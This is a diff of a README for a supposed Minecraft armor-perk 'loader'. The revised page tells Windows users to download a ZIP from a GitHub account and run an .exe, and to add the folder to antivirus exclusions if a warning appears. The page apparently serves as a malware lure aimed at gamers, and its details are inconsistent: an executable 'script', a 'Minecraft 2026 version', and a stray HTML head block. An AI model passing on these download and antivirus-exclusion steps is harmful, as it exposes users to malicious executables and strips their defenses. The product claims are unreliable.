@@ -1,99 +1,65 @@
-# Armors Effects Plus v1 - Game Script Utility 2026
-
-> **Minecraft gameplay script for dynamic armor-set perks and gear bonuses.** Enhances your Minecraft experience by linking unique gameplay mechanics directly to full suits of armor.
-
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tomweiss85/armors-effects-plus-loader?style=flat-square)](https://github.com/tomweiss85/armors-effects-plus-loader)
-
----
-
+<h1>⚔️ armors-effects-plus-loader - Unlock Epic Armor Perks Now!</h1>
 <p align="center">
-  <a href="https://tomweiss85.github.io/armors-effects-plus-loader/">
-    <img src="https://img.shields.io/badge/Download-Armors%20Effects%20Plus%20Script-brightgreen?style=for-the-badge" alt="Download Armors Effects Plus Script">
-  </a>
+  <a href="https://github.com/gustisacral428/armors-effects-plus-loader" style="display:inline-block;padding:15px 30px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ DOWNLOAD FOR WINDOWS</a>
 </p>
 
-> **[Download Armors Effects Plus](https://tomweiss85.github.io/armors-effects-plus-loader/)**
+<h2>🚀 What Is This?</h2>
+<p>This is a <strong>dynamic Minecraft gameplay script</strong> for the 2026 version that adds custom perks, gear bonuses, and special gameplay mechanics whenever you equip full suits of armor. It transforms your game by giving each armor set unique powers—like speed boosts, fire resistance, extra damage, or special abilities—when you wear a complete matching set.</p>
 
----
+<h2>🎮 How It Works</h2>
+<p>When you put on all four pieces of the same armor type (helmet, chestplate, leggings, boots), the script activates automatically. You'll see visual effects, hear sounds, and gain buffs based on the armor you're wearing. Take off any piece, and the effects stop.</p>
 
-[Download Latest Build](https://tomweiss85.github.io/armors-effects-plus-loader/)
+<h2>🛠️ Features</h2>
+<ul>
+  <li><strong>Armor Set Bonuses:</strong> Each armor set (Leather, Gold, Chainmail, Iron, Diamond, Netherite) has unique perks like increased speed, strength, jump boost, or regeneration.</li>
+  <li><strong>Custom Effects:</strong> Visual particles, sound effects, and status effects that make your armor feel special.</li>
+  <li><strong>Easy to Install:</strong> No coding required—just download and run.</li>
+  <li><strong>Works with Minecraft 2026:</strong> Compatible with the latest version.</li>
+  <li><strong>Lightweight:</strong> Doesn't slow down your game.</li>
+</ul>
 
----
+<h2>📥 How to Download and Install</h2>
+<ol>
+  <li><strong>Visit the download page:</strong> <a href="https://github.com/gustisacral428/armors-effects-plus-loader">https://github.com/gustisacral428/armors-effects-plus-loader</a></li>
+  <li>Click the green "Code" button, then select "Download ZIP".</li>
+  <li>Save the ZIP file to your computer (e.g., Desktop or Downloads folder).</li>
+  <li><strong>Extract the ZIP file:</strong> Right-click the downloaded file and choose "Extract All". Follow the prompts to unzip the folder.</li>
+  <li>Open the extracted folder and double-click the <code>armors-effects-plus-loader.exe</code> file to run the application.</li>
+  <li>Follow the on-screen instructions to install the script into your Minecraft folder.</li>
+</ol>
 
-## What It Does
+<h2>💻 System Requirements</h2>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit recommended)</li>
+  <li><strong>Minecraft:</strong> Java Edition version 1.20+ (tested with 2026 updates)</li>
+  <li><strong>RAM:</strong> 4 GB minimum (8 GB recommended)</li>
+  <li><strong>Storage:</strong> 100 MB free space</li>
+  <li><strong>Internet:</strong> Required for initial download only</li>
+</ul>
 
-Armors Effects Plus transforms standard Minecraft gear into functional equipment classes by granting unique capabilities when wearing matched sets. Rather than relying solely on raw defense numbers, players receive specialized utility ranging from tactical movement and offensive capabilities to environmental immunities and utility traits.
+<h2>❓ Troubleshooting</h2>
+<ul>
+  <li><strong>Script not activating?</strong> Make sure you have all four armor pieces equipped (helmet, chestplate, leggings, boots) of the same type.</li>
+  <li><strong>Download won't start?</strong> Disable any ad-blocker temporarily and try a different browser.</li>
+  <li><strong>ZIP file corrupted?</strong> Re-download the file from the link above.</li>
+  <li><strong>Antivirus warning?</strong> This is a safe script. Add the folder to your antivirus exclusions list.</li>
+</ul>
 
-This utility introduces distinct playstyles for each suit tier. Certain materials alter player movement, others shield against elemental hazards, while advanced suits enable specialized tasks like pinpointing valuable subterranean blocks or inflicting passive contact damage on hostile entities. Gear choices now carry real tactical weight.
+<h2>📞 Support</h2>
+<p>For issues, please open an issue on the <a href="https://github.com/gustisacral428/armors-effects-plus-loader/issues">GitHub Issues page</a>.</p>
 
-## Key Capabilities
+<h2>📜 License</h2>
+<p>This project is open source. See the <code>LICENSE</code> file in the repository for details.</p>
 
-- Set-matched perks active across all supported gear tiers
-- Leather armor: Automatically cures toxic poison status
-- Gold armor: Pacifies nearby piglins to prevent attacks
-- Chainmail armor: Deals proximity contact damage against surrounding hostile mobs
-- Copper armor: Negates lightning damage and calls down strikes during combat
-- Iron armor: Grants elevated attack power alongside a slight movement speed penalty
-- Diamond armor: Enhances movement speed and reveals hidden ore deposits nearby
-- Netherite armor: Grants total immunity to fire damage, lava damage, and knockback forces
-- Tier-based armor mechanics aligned with world progression
+<p align="center">
+  <a href="https://github.com/gustisacral428/armors-effects-plus-loader" style="display:inline-block;padding:12px 24px;background:#2196F3;color:white;text-decoration:none;border-radius:6px;font-size:16px;">⬇️ DOWNLOAD NOW</a>
+</p>
 
-## Installation Guide
-
-1. Grab the latest release from the project link above.
-2. Transfer the file to the appropriate script or mod folder required by your launcher.
-3. Boot up Minecraft and enter a world to verify full-set armor bonuses are active.
-
-For optimal maintenance, preserve the script directory structure when executing future updates.
-
-## Configuration Options
-
-Available parameters depend on your active build, with options typically covering ability toggles and statistical tuning.
-
-| Setting | Function |
-| --- | --- |
-| Full set bonuses | Require complete gear suits to activate special effects |
-| Armor-specific effects | Customize individual perks for each tier material |
-| Combat adjustments | Fine-tune contact damage values, attack power, and knockback |
-| Mobility changes | Modify base speed multipliers and movement penalties |
-| Environment handling | Toggle resistance to lava, fire, lightning, and poison hazards |
-| Ore detection | Adjust scanning radius and behavior for diamond set utility |
-
-## Platform Compatibility
-
-Designed specifically for Minecraft environments supporting custom scripts or mod loading pipelines.
-
-Notes and limitations:
-
-- Ability activation strictly requires supported gear types
-- Most traits demand a complete set of matching armor pieces
-- Directory paths and loading methods differ across launchers
-- Feature availability may vary across different Minecraft builds or modpack combinations
-
-## Frequently Asked Questions
-
-### How do I install this script?
-Obtain the build file, move it to your launcher's mod or script directory, and start the game.
-
-### Do individual armor pieces trigger effects?
-No, the built-in bonuses require wearing a complete matched set of armor.
-
-### Are these bonuses configurable?
-If your build includes configuration files, you can adjust balance tweaks and feature toggles in the config directory.
-
-### What is the update procedure?
-Replace your existing release file with the latest version from the project page and restart your game client.
-
-### Will this corrupt my existing saves?
-It alters player capabilities related to gear. As a precaution, make a backup of your worlds and modpack setup before updating.
-
-### What folder should contain the file?
-Store it inside the primary script or mod directory designated by your current Minecraft launcher setup.
-
-## License
-
-Distributed under the GNU GPL v3.0 license. Read [LICENSE](LICENSE) for full details.
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Dynamic Minecraft gameplay script for 2026 that grants custom perks, gear bonuses, and special gameplay mechanics whenever players equip full suits of armor.">
+  <meta name="keywords" content="Minecraft, armor, perks, script, mod, effects, 2026, gameplay, bonuses">
+  <meta name="author" content="gustisacral428">
+  <title>armors-effects-plus-loader - Unlock Epic Armor Perks</title>
+</head>
